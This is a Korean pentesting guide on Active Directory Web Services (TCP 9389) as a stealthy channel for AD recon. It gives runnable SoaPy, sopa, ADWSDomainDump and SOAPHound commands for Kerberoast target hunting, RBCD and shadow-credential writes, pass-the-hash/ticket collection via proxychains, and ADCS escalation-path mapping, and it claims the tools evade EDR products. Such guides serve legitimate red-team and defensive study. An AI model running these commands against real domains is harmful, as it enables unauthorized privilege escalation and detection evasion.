# Active Directory Web Services (ADWS) 열거 및 은밀한 수집

{{#include ../../banners/hacktricks-training.md}}

## ADWS란?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화**되며 TCP **9389** 포트를 수신합니다. 이름과 달리 **HTTP는 사용되지 않습니다**. 대신 이 서비스는 독점적인 .NET 프레이밍 프로토콜 스택을 통해 LDAP 스타일 데이터를 제공합니다:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

트래픽은 이러한 바이너리 SOAP 프레임 안에 캡슐화되어 일반적이지 않은 포트를 통해 전송되므로, **ADWS를 통한 열거는 기존 LDAP/389 및 636 트래픽보다 검사, 필터링 또는 시그니처 탐지될 가능성이 훨씬 낮습니다**. 이는 공격자에게 다음을 의미합니다:<sup>[[1]](#references)[[7]](#references)</sup>

* 더 은밀한 정찰 – Blue team은 LDAP 쿼리에 집중하는 경우가 많습니다.
* SOCKS proxy를 통해 9389/TCP를 터널링하여 **Windows가 아닌 호스트(Linux, macOS)**에서도 수집 가능.
* LDAP를 통해 얻을 수 있는 것과 동일한 데이터(사용자, 그룹, ACL, 스키마 등)를 얻고 **쓰기**도 수행 가능(예: **RBCD**용 `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS 상호작용은 WS-Enumeration을 통해 구현됩니다. 각 쿼리는 LDAP 필터/속성을 정의하는 `Enumerate` 메시지로 시작해 `EnumerationContext` GUID를 반환하며, 이후 하나 이상의 `Pull` 메시지로 서버가 정의한 결과 창까지 데이터를 스트리밍합니다.<sup>[[7]](#references)</sup> 컨텍스트는 약 30분 후 만료되므로, 도구는 상태가 손실되지 않도록 결과를 페이지로 나누거나 필터를 분할해야 합니다(CN별 접두사 쿼리).<sup>[[8]](#references)</sup> 보안 설명자를 요청할 때는 SACL을 제외하도록 `LDAP_SERVER_SD_FLAGS_OID` 컨트롤을 지정해야 합니다. 그렇지 않으면 ADWS는 SOAP 응답에서 `nTSecurityDescriptor` 속성을 그냥 누락합니다.

> 참고: ADWS는 여러 RSAT GUI/PowerShell 도구에서도 사용되므로, 트래픽이 정상적인 관리자 활동에 섞일 수 있습니다.

## SoaPy – 네이티브 Python 클라이언트

[SoaPy](https://github.com/logangoins/soapy)는 **순수 Python으로 ADWS 프로토콜 스택을 완전히 재구현한 도구**입니다. NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 생성하므로 .NET 런타임을 사용하지 않고도 Unix 계열 시스템에서 수집할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 주요 기능

* **SOCKS를 통한 proxying** 지원(C2 implant에서 유용).
* LDAP `-q '(objectClass=user)'`와 동일한 세밀한 검색 필터.
* RBCD, SPN, 계정 플래그 및 키 자격 증명을 위한 표적 **쓰기** 작업.<sup>[[2]](#references)</sup>
* SOAPy 출력은 **BOFHound**로 파싱해 BloodHound에 가져올 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>
* 사람이 읽기 쉬운 형식이 필요할 때 타임스탬프 및 `userAccountControl`을 보기 좋게 출력하는 `--parse` 플래그.<sup>[[2]](#references)</sup>

### 표적 수집 플래그 및 쓰기 작업

SoaPy에는 ADWS를 통해 가장 일반적인 LDAP 헌팅 작업을 수행하는 엄선된 스위치가 포함되어 있습니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`와 사용자 지정 수집을 위한 원시 `--query` / `--filter` 옵션입니다. 여기에 `--rbcd <source>`(`msDs-AllowedToActOnBehalfOfOtherIdentity` 설정), `--spn <service/cn>`(표적 Kerberoasting을 위한 SPN 준비), `--asrep`(`userAccountControl`에서 `DONT_REQ_PREAUTH` 활성화)와 같은 쓰기 기능을 조합할 수 있습니다.<sup>[[2]](#references)</sup>

`samAccountName`과 `servicePrincipalName`만 반환하는 표적 SPN 헌팅 예시:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

동일한 host/credentials를 사용해 findings를 즉시 weaponise하세요. `--rbcds`로 이미 구성된 RBCD 객체를 dump한 다음, `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'`를 적용해 Resource-Based Constrained Delegation chain을 준비합니다(전체 abuse 경로는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).<sup>[[2]](#references)</sup>

### 설치 (operator host)

upstream repository에서 최신 SOAPy CLI를 설치합니다. 실행 파일 이름은 Unix 계열 시스템에서 대소문자를 구분합니다.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### SOCKS pivot를 통한 ticket만 사용하는 수집

foothold에서 Kerberos ticket은 제공되지만 plaintext password가 없는 경우, [Pass the Ticket](pass-the-ticket.md)에 설명된 대로 `.kirbi` ticket을 `ccache`로 변환한 다음 SOAPy가 해당 cache를 사용하도록 지정합니다. DC의 LDAP service용 ticket은 문서화된 SOAPy ADWS workflow에서 사용할 수 있습니다. ADWS와 Kerberos 트래픽을 모두 pivot을 통해 라우팅하세요.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### ADWS를 통한 Shadow credentials

현재 principal에 대상 객체의 `msDS-KeyCredentialLink`를 쓸 권한이 있다면, SOAPy를 통해 ADWS로 key credential을 추가하고 해당 PFX를 내보낼 수 있습니다. 전체 attribute를 지우는 대신, 정확하게 제거할 수 있도록 반환된 DeviceID를 기록해 두세요. [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md)에 설명된 대로 PKINIT에 PFX를 사용하세요.<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – ADWS를 통한 LDAPDomainDump (Linux/Windows)

* `ldapdomaindump`의 fork로, LDAP-signature 탐지를 줄이기 위해 LDAP 쿼리를 TCP/9389의 ADWS 호출로 대체합니다.
* `--force`가 지정되지 않으면 9389에 대한 초기 연결 가능 여부를 확인합니다(포트 스캔이 noisy/filtered인 경우 프로브를 건너뜁니다).
* README에 Microsoft Defender for Endpoint 및 CrowdStrike Falcon을 대상으로 테스트하여 성공적으로 우회했다고 나와 있습니다.<sup>[[4]](#references)</sup>

### 설치

```bash
pipx install .
```

### 사용법

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

일반적인 출력 로그에는 9389 도달 가능성 검사, ADWS 바인드, 덤프 시작/완료가 표시됩니다:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Golang용 실용적인 ADWS 클라이언트

soapy와 마찬가지로 [sopa](https://github.com/Macmod/sopa)는 Golang으로 ADWS 프로토콜 스택(MS-NNS + MC-NMF + SOAP)을 구현하고, 다음과 같은 ADWS 호출을 실행하는 명령줄 플래그를 제공합니다:<sup>[[5]](#references)</sup>

* **개체 검색 및 조회** - `query` / `get`
* **개체 수명 주기 관리** - `create [user|computer|group|ou|container|custom]` 및 `delete`
* **특성 편집** - `attr [add|replace|delete]`
* **계정 관리** - `set-password` / `change-password`
* 그 밖에 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` 등이 있습니다.

### 프로토콜 매핑 주요 내용

* LDAP 스타일 검색은 특성 프로젝션, 범위 제어(Base/OneLevel/Subtree), 페이지네이션을 지원하는 **WS-Enumeration**(`Enumerate` + `Pull`)을 통해 수행됩니다.
* 단일 개체 가져오기에는 **WS-Transfer** `Get`을, 특성 변경에는 `Put`을, 삭제에는 `Delete`를 사용합니다.
* 기본 제공 개체 생성에는 **WS-Transfer ResourceFactory**를 사용하고, 사용자 지정 개체에는 YAML 템플릿을 기반으로 하는 **IMDA AddRequest**를 사용합니다.
* 암호 작업은 **MS-ADCAP** 액션(`SetPassword`, `ChangePassword`)을 사용합니다.<sup>[[5]](#references)</sup>

### 인증되지 않은 메타데이터 검색(mex)

ADWS는 자격 증명 없이 WS-MetadataExchange를 노출하므로, 인증 전에 노출 여부를 빠르게 확인할 수 있습니다:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC 검색 및 Kerberos 타깃팅 참고 사항

`--dc`를 생략하고 `--domain`을 지정하면 Sopa는 SRV를 통해 DC를 확인할 수 있습니다. 다음 순서로 쿼리하고 우선순위가 가장 높은 타깃을 사용합니다:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

운영 시 분할된 환경에서 오류를 방지하려면 DC가 제어하는 resolver를 우선 사용하세요.

* `--dns <DC-IP>`를 사용해 **모든** SRV/PTR/정방향 조회가 DC DNS를 거치도록 합니다.
* UDP가 차단되었거나 SRV 응답이 큰 경우 `--dns-tcp`를 사용합니다.
* `--dc`가 IP인 경우, sopa는 항상 **역방향 PTR** 조회를 수행합니다. ADWS의 `wsa:To` 주소 필터에는 Kerberos를 사용하지 않더라도 FQDN이 필요합니다. 역방향 zone이 없는 경우 DC FQDN을 직접 지정하세요.<sup>[[5]](#references)</sup>

예시(IP + Kerberos, DC를 통한 DNS 조회 강제):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### 인증 자료 옵션

평문 비밀번호 외에도 sopa는 ADWS 인증에 **NT 해시**, **Kerberos AES 키**, **ccache**, **PKINIT 인증서**(PFX 또는 PEM)를 지원합니다. `--aes-key`, `-c`(ccache) 또는 인증서 기반 옵션을 사용하면 Kerberos가 자동으로 사용됩니다.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### 템플릿을 통한 사용자 지정 객체 생성

임의의 객체 클래스의 경우 `create custom` 명령은 IMDA `AddRequest`에 매핑되는 YAML 템플릿을 사용합니다:<sup>[[5]](#references)</sup>

* `parentDN`과 `rdn`은 컨테이너와 상대 DN을 정의합니다.
* `attributes[].name`은 `cn` 또는 네임스페이스가 지정된 `addata:cn`을 지원합니다.
* `attributes[].type`은 `string|int|bool|base64|hex` 또는 명시적인 `xsd:*`를 허용합니다.
* `ad:relativeDistinguishedName` 또는 `ad:container-hierarchy-parent`는 포함하지 **마세요**. sopa가 이를 삽입합니다.
* `hex` 값은 `xsd:base64Binary`로 변환됩니다. 빈 문자열을 설정하려면 `value: ""`를 사용하세요.

## SOAPHound – 대량 ADWS 수집 (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)는 모든 LDAP 상호작용을 ADWS 내부에서 처리하고 BloodHound v4 호환 JSON을 출력하는 .NET 수집 도구입니다. 먼저 `objectSid`, `objectGUID`, `distinguishedName`, `objectClass`의 전체 캐시를 생성한 다음(`--buildcache`), 이를 재사용해 대량의 `--bhdump`, `--certdump`(ADCS) 또는 `--dnsdump`(AD 통합 DNS) 작업을 수행하므로, 약 35개의 핵심 속성만 DC 외부로 전송됩니다. AutoSplit(`--autosplit --threshold <N>`)은 대규모 포리스트에서 30분 EnumerationContext 시간 제한을 넘지 않도록 CN 접두사별로 쿼리를 자동 분할합니다.<sup>[[8]](#references)</sup>

도메인에 가입된 운영자 VM에서의 일반적인 워크플로:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Export된 JSON은 SharpHound/BloodHound workflows에 바로 사용할 수 있습니다. 후속 graphing 아이디어는 [BloodHound methodology](bloodhound.md)를 참고하세요. AutoSplit은 쿼리 수를 ADExplorer 스타일 스냅샷보다 낮게 유지하면서, SOAPHound가 수백만 개 객체가 있는 forest에서도 안정적으로 작동하도록 합니다.

## Stealth AD Collection Workflow

다음 workflow는 Linux에서 ADWS를 통해 **domain & ADCS objects**를 열거하고, 이를 BloodHound JSON으로 변환한 뒤, 인증서 기반 attack paths를 탐색하는 방법을 보여줍니다.

1. **9389/TCP를** 대상 네트워크에서 사용자 시스템으로 터널링합니다(예: Chisel, Meterpreter, SSH dynamic port-forward 등을 사용). 원시 TCP client는 `proxychains4 SOAPy ...`를 통해 SOCKS로 라우팅합니다(`proxychains4.conf`에서 SOCKS5 주소를 설정). `HTTPS_PROXY`는 이 비-HTTP 프로토콜을 프록시하지 않습니다.<sup>[[9]](#references)</sup>

2. **root domain object를 수집합니다:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Configuration NC에서 ADCS 관련 객체 수집:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **BloodHound로 변환:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **ZIP을 업로드**한 다음 BloodHound GUI에서 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 같은 cypher 쿼리를 실행해 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` 쓰기 (RBCD)

대상 컴퓨터 객체에 대한 쓰기 권한이 있다면, 원시 security-descriptor 문자열 대신 SOAPy의 RBCD action을 사용합니다. 여기서 `WEBSRV01$`은 제어 중인 소스이고, `FILE01$`은 속성이 변경될 대상입니다.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Kerberos S4U chain은 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)에서 이어집니다.

## 도구 요약

| 목적 | 도구 | 참고 |
|---------|------|-------|
| ADWS 열거 | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, 읽기/쓰기 |
| 대량 ADWS 덤프 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS 모드 |
| BloodHound 데이터 가져오기 | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch 로그 변환 |
| 인증서 침해 | [Certipy](https://github.com/ly4k/Certipy) | 동일한 SOCKS를 통해 프록시 가능 |
| ADWS 열거 및 객체 변경 | [sopa](https://github.com/Macmod/sopa) | 알려진 ADWS 엔드포인트에 연결하는 범용 클라이언트. 열거, 객체 생성, 속성 수정 및 암호 변경 지원 |



## References

- [1] [SpecterOps – SOAP(y)를 꼭 사용하세요 – ADWS를 사용한 은밀한 AD 수집을 위한 Operator 가이드](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF 사양](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWS를 통한 Active Directory 환경의 은밀한 열거](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS를 통해 Active Directory 데이터를 수집하는 SOAPHound 도구](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [SOAPy Wiki – 정찰](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [SOAPy Wiki – 침해 후 활동](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
